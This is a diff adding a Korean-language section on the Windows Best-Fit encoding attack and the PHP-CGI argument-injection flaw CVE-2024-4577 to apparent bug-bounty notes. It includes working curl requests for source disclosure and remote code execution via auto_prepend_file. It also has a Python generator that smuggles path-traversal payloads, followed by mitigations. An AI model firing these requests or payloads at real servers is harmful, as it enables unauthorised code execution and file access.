@@ -1430,6 +1430,98 @@ NTLM  → aad3b435b51404eeaad3b435b51404ee:hash (Windows)
 
 ---
 
+## 14. WorstFit — Windows Best-Fit 인코딩 공격 (CVE-2024-4577)
+
+Windows의 ANSI API는 유니코드(wide) 문자열을 ANSI(single-byte)로 변환할 때, 매핑 테이블에 없는 문자를 **시각적으로 비슷한 ASCII 문자로 자동 치환**한다. 이를 Best-Fit 매핑이라 하며, 특히 CJK(한/중/일) 코드페이지에서 특정 유니코드 문자가 백슬래시(`\`)나 하이픈(`-`)으로 바뀐다. 입력 검증을 우회한 문자가 변환 뒤에 위험한 문자로 되살아나므로 **경로 우회(path traversal)·인자 주입(argument injection)·원격 코드 실행(RCE)**으로 이어진다. 2024년 PHP-CGI RCE(CVE-2024-4577)가 대표 사례다.
+
+### 핵심 매핑 (CJK 코드페이지)
+
+| 유니코드 | 문자 | Best-Fit 결과 | 악용 |
+|---|---|---|---|
+| `U+00A5` | ¥ (Yen Sign) | `0x5C` `\` | 경로 우회·파일명 스머글링 |
+| `U+20A9` | ₩ (Won Sign) | `0x5C` `\` | 경로 우회 (CP949 한국어) |
+| `U+00AD` | (soft hyphen) | `0x2D` `-` | 인자 주입 (옵션 재활성화) |
+| 전각 문자 | ／ ＜ ＞ 등 | 대응 ASCII | 필터 우회 |
+
+> 매핑은 코드페이지마다 다르다: `U+00A5`는 CP932(일본어)에서 `\`, CP1250(동유럽)에서는 `Y`로 변환된다. 대상 서버 로케일에 맞춰 페이로드를 선택해야 한다.
+
+### CVE-2024-4577 — PHP-CGI 인자 주입 RCE
+
+원래 CVE-2012-1823은 `QUERY_STRING`이 `-`로 시작하면 `php-cgi`에 명령행 옵션이 주입되는 취약점이었고, 패치는 "쿼리스트링 선두의 `-`"를 차단했다. 그러나 Best-Fit 때문에 다음이 성립한다.
+
+```text
+요청:   http://vuln.host/index.php?%ADs
+        (%AD = soft hyphen U+00AD)
+변환:   soft hyphen → '-'  (Best-Fit, CJK 로케일)
+결과:   php-cgi.exe -s     → 소스코드 노출, -d 옵션 체인으로 RCE
+```
+
+```bash
+# 소유·허가된 실습 서버에서만 — 취약 여부 진단(소스 노출 신호)
+curl -s "http://TARGET/index.php?%ADs" | head    # PHP 소스가 그대로 보이면 취약
+# RCE 체인(진단용): auto_prepend_file로 임의 PHP 실행
+curl -s "http://TARGET/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" \
+     --data '<?php echo shell_exec("whoami"); ?>'
+```
+
+### Best-Fit 페이로드 생성기 (진단용)
+
+```python
+#!/usr/bin/env python3
+"""Best-Fit 문자 → ASCII 변환 후보를 생성해 필터 우회 페이로드를 만든다.
+   소유/허가된 대상 점검에만 사용."""
+
+# CJK 코드페이지에서 백슬래시/하이픈으로 Best-Fit되는 대표 문자
+BEST_FIT = {
+    "\\": ["¥", "₩"],   # ¥, ₩ → '\'
+    "-":  ["­"],             # soft hyphen → '-'
+    "/":  ["／"],             # fullwidth solidus → '/'
+    "<":  ["＜"],
+    ">":  ["＞"],
+}
+
+
+def smuggle(payload: str) -> list[str]:
+    """payload 안의 위험 문자를 Best-Fit 후보로 치환한 변형 목록."""
+    variants = [payload]
+    for ascii_ch, uni_list in BEST_FIT.items():
+        if ascii_ch in payload:
+            for u in uni_list:
+                variants.append(payload.replace(ascii_ch, u))
+    return variants
+
+
+if __name__ == "__main__":
+    for v in smuggle("..\\..\\..\\windows\\win.ini"):
+        # URL 인코딩해 전송하면 서버 ANSI 변환 단계에서 '\'로 복원됨
+        print(v.encode("utf-8").hex(), v)
+```
+
+### 공격 표면과 영향 범위
+
+- **Path / Filename**: `..¥..¥` 형태로 디렉터리 트래버설·파일명 스머글링
+- **Environment Variable / Command Line**: `GetCommandLineA`·`getenv` 기반 프로그램에 옵션 주입
+- **Registry / Active Directory**: ANSI 조회 API가 값을 재해석
+
+Windows로 포팅된 다수 OSS가 기본 `main(int argc, char* argv[])`(ANSI)을 쓰기 때문에 영향을 받았다 — PHP, curl, wget, tar, Java, Perl, PostgreSQL, OpenSSL 등.
+
+### 방어
+
+```text
+[사용자]  제어판 → 국가/지역 → 관리자 언어 설정 →
+          "Beta: 세계 언어 지원을 위해 Unicode UTF-8 사용" 활성화
+          (시스템 코드페이지를 65001/UTF-8로 → Best-Fit 경로 제거)
+
+[개발자]  1) 와이드char API 사용: wmain, _wgetenv, _wgetcwd,
+             CommandLineToArgvW (ANSI 진입점 회피)
+          2) WideCharToMultiByte 호출 시 WC_NO_BEST_FIT_CHARS 플래그
+          3) MultiByteToWideChar 시 MB_ERR_INVALID_CHARS로 무효 문자 거부
+```
+
+> 버그바운티 관점: Windows에서 구동되는 웹앱/CGI·파일 업로드·아카이브 처리 기능을 만나면 `%A5`·`%AD`·전각 문자로 인코딩 필터·경로 검증을 테스트해 볼 가치가 있다([[05_advanced_vuln_chains]], [[12_LFI/RFI]]).
+
+---
+
 <!-- detect-validate-12 -->
 ## 스코프 검증과 발견 재현
 
